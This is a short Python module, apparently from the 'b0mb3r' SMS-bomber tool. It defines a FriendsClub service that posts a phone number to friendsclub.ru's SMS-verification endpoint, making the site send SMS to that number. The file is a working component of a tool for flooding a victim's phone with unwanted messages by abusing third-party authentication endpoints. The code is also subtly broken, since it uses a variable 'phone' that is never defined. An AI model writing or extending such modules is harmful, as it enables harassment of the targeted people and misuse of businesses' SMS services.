from b0mb3r.services.service import Service


class FriendsClub(Service):
    async def run(self):
        await self.post(
            "https://friendsclub.ru/assets/components/pl/connector.php",
            data={"casePar": "authSendsms", "MobilePhone": "+" + phone},
        )
